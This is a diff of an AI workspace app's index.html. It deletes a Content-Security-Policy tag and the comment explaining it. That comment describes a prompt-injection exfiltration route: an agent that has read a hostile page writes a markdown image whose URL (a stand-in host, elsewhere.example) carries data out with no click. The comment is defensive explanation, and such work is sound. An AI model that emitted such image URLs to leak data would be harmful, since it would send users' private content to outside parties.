@@ -2,67 +2,16 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <!--
-      The third and last enforcement of the rule in src/resource-policy.ts, and the only one that
-      survives the markdown pipeline being replaced: the browser refuses the request itself.
-
-      A message athanor writes is agent-authored text, and an agent that has just read a hostile
-      page writes what it read. `![](https://elsewhere.example/p.png?d=…)` is then a fetch with no
-      click and no approval — the address is the payload. `img-src` and `media-src` close that, and
-      `base-uri 'none'` stops a `<base>` from turning every relative address in the app into a
-      remote one. `connect-src` is deliberately absent: the workspace runner's stream and terminal
-      are legitimately on another origin, and a directive that breaks them would be removed rather
-      than fixed. This is the same policy the desktop shell has always enforced
-      (apps/desktop/src-tauri/tauri.conf.json); only the browser was open.
-    -->
-    <meta
-      http-equiv="Content-Security-Policy"
-      content="img-src 'self' data: blob:; media-src 'self' data: blob:; font-src 'self' data:; object-src 'none'; base-uri 'none'"
-    />
-    <!--
-      `interactive-widget=resizes-content` is Chromium-only. There the software keyboard shrinks the
-      layout viewport and `dvh` follows it, which is the whole fix on Android. WebKit ignores the
-      attribute: an iPhone 15 keeps reporting 852px with about 336px of it behind the keyboard. That
-      gap is measured from `visualViewport` in src/main.tsx and published as `--keyboard`. The two
-      cannot double-count, because wherever this attribute is honoured the gap it measures is zero.
-    -->
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1.0, viewport-fit=cover, interactive-widget=resizes-content"
-    />
-    <meta name="theme-color" content="#0f0d0a" />
-    <meta name="color-scheme" content="dark" />
-    <meta
-      name="description"
-      content="One private AI computer, available from every device. Free and open source."
-    />
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="athanor" />
-    <meta
-      property="og:description"
-      content="One private AI computer, available from every device."
-    />
-    <meta property="og:image" content="/og-athanor.png" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
-    <meta
-      property="og:image:alt"
-      content="athanor: a chat beside the files, terminal and browser of one private computer."
-    />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="athanor" />
-    <meta
-      name="twitter:description"
-      content="One private AI computer, available from every device."
-    />
-    <meta name="twitter:image" content="/og-athanor.png" />
-    <link rel="manifest" href="/manifest.webmanifest" />
-    <link rel="icon" href="/brand/athanor-icon-192.png" type="image/png" />
-    <link rel="apple-touch-icon" href="/brand/athanor-apple-touch.png" />
-    <title>athanor</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+    <meta name="theme-color" content="#151d19" />
+    <meta name="color-scheme" content="dark light" />
+    <meta name="description" content="Your own computer for ideas, questions, and work." />
+    <link rel="icon" type="image/svg+xml" href="/athanor-mark.svg" />
+    <title>athanor · Your workspace</title>
   </head>
   <body>
     <div id="root"></div>
+    <noscript>This workspace needs JavaScript to connect to your computer.</noscript>
     <script type="module" src="/src/main.tsx"></script>
   </body>
 </html>
